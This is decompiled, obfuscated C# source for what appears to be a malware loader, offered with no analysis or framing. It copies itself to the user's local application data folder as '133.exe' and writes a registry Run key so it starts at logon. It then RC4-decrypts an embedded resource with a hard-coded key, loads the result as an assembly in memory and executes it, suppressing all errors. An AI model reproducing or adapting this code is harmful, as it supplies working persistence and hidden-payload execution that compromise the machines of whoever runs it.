using System;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace ns0;

internal sealed class Class0
{
	internal sealed class Class1
	{
	}

	private static void Main(string[] args)
	{
		//IL_01a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ae: Expected O, but got Unknown
		Class3.Class5.Class6.smethod_0();
		object[] parameters = new object[0];
		Class7.smethod_0(new Random(), 300, 750, 827, 852);
		long num = Class3.Class5.smethod_0('\u02df', 700);
		_ = Class3.Class5.smethod_0('É', 170) - num;
		if (!Class3.Class4.smethod_2(Class7.smethod_1(Class3.Class5.smethod_1(Environment.SpecialFolder.LocalApplicationData, 595, 603), "\\133.exe", 834, 803), 'Ȫ', 549))
		{
			Class3.Class5.Class6.smethod_5(Class3.Class5.smethod_4('ϔ', 910), Class7.smethod_1(Class3.Class5.smethod_1(Environment.SpecialFolder.LocalApplicationData, 292, 300), "\\133.exe", 751, 654), 'ǈ', 449);
		}
		string gparam_ = (string)(IComparable)smethod_0("nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS");
		RegistryKey gparam_2 = (RegistryKey)(IDisposable)Class7.smethod_5(Registry.CurrentUser, gparam_, bool_0: true, 948, 1017);
		Class3.Class5.Class6.smethod_6(gparam_2, "tdetreytrtuytryr", (object)Class7.smethod_1(Class3.Class5.smethod_1(Environment.SpecialFolder.LocalApplicationData, 296, 288), "\\133.exe", 382, 287), 310, 321);
		Class3.Class5.Class6.smethod_7(gparam_2, 954, 922);
		try
		{
			ResourceManager gparam_3 = new ResourceManager("res", Class7.smethod_2(307, 'ŝ'));
			byte[] byte_ = (byte[])(ICloneable)smethod_1((byte[])Class8.Class9.Class10.smethod_5(gparam_3, "2xKs97pYx3VpF63CYm", 'Ʊ', 'ǚ'), "BkOkHpOB1KJaIM90FsA4HiH6WQkbr8lzM3T0BS2YxPCPyZzXg6fQufcsN");
			Class12.smethod_2(gparam_3, 849, 864);
			Assembly gparam_4 = (Assembly)(_Assembly)Class8.Class9.smethod_9(byte_, 771, 772);
			if (Class12.smethod_3((MethodBase)Class8.Class9.smethod_10(gparam_4, 924, 992), '\u0338', 867).Length > 0)
			{
				parameters = new object[1] { args };
			}
			Class8.Class9.smethod_10(gparam_4, 219, 167).Invoke(null, parameters);
		}
		catch
		{
		}
	}

	private static string smethod_0(string string_0)
	{
		char[] array = (char[])(Array)Class7.smethod_6(string_0, 359, 346);
		Class3.smethod_0((Array)array, 964, 'ϓ');
		return new string(array);
	}

	public static byte[] smethod_1(byte[] byte_0, string string_0)
	{
		byte[] array = Class3.smethod_2(Class3.smethod_1('ɢ', 577), string_0, 124, '2');
		byte[] array2 = new byte[256];
		byte[] array3 = new byte[256];
		int i;
		for (i = 0; i < 256; i++)
		{
			array2[i] = (byte)i;
			array3[i] = array[i % Class3.Class5.smethod_5((Array)array, 0, (short)90, '\b')];
		}
		int num = 0;
		for (i = 0; i < 256; i++)
		{
			num = (num + array2[i] + array3[i]) % 256;
			byte b = array2[i];
			array2[i] = array2[num];
			array2[num] = b;
		}
		num = 0;
		i = 0;
		for (int j = 0; j < Class12.Class13.smethod_6((Array)byte_0, 0, 'ÿ', 240); j++)
		{
			i = (i + 1) % 256;
			num = (num + array2[i]) % 256;
			byte b = array2[i];
			array2[i] = array2[num];
			array2[num] = b;
			int num2 = (array2[i] + array2[num]) % 256;
			byte_0[j] ^= array2[num2];
		}
		return byte_0;
	}
}
